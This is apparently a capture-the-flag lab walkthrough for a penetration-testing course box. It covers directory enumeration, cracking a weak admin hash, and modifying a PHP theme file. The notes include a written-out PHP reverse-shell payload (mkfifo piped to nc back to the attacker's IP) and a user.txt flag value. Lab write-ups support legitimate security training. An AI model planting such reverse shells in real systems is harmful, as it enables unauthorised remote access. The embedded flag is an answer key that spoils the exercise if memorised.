Remember that enumeration is an iterative process. After performing our `Nmap` port scans, make sure to perform detailed enumeration against all open ports based on what is running on the discovered ports. Follow the same process as we did with `Nibbles`:

-   Enumeration/Scanning with `Nmap` - perform a quick scan for open ports followed by a full port scan
-   Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include `whatweb` and `Gobuster`
-   If you identify the website URL, you can add it to your '/etc/hosts' file with the IP you get in the question below to load it normally, though this is unnecessary.
-   After identifying the technologies in use, use a tool such as `Searchsploit` to find public exploits or search on Google for manual exploitation techniques
-   After gaining an initial foothold, use the `Python3 pty` trick to upgrade to a pseudo TTY
-   Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials
-   Organize this data offline to determine the various ways to escalate privileges to root on this target

There are two ways to gain a foothold—one using `Metasploit` and one via a manual process. Challenge ourselves to work through and gain an understanding of both methods.

There are two ways to escalate privileges to root on the target after obtaining a foothold. Make use of helper scripts such as [LinEnum](https://github.com/rebootuser/LinEnum) and [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to assist you. Filter through the information searching for two well-known privilege escalation techniques.

Have fun, never stop learning, and do not forget to `think outside of the box`!

Spawn the target, gain a foothold and submit the contents of the user.txt flag.

`7002d65b149b0a4d19132a66feed21d8`
* `nmap <ip>` for available ports
* connect to the ip given through port 80
* `gobuster dir -u http://<ip given> -w /usr/share/dirb/wordlists/common.txt` youll find admin is a valid user
* `gobuster dir -u http://<ip given>/admin -w /usr/share/dirb/wordlists/common.txt` youll find the hash for admin user
* decode hash on google, youll find the password is admin and it was coded on SHA1
* access admin page with user ans pass
* surfing through the page you can notice the theme files can be modified
* used a php user id check tag on one of them (my case was sidebar.inc.php)
* `curl http://10.129.246.183/theme/Innovation/sidebar.inc.php` will return a user id, means the script works
* do reverse shell by saving the script <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> <listening port>>/tmp/f"); ?>
* check python version installed on the page `which python3`
* upgrade to full TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
* use command `find / -name "user.txt"` to find the file and open it


After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.

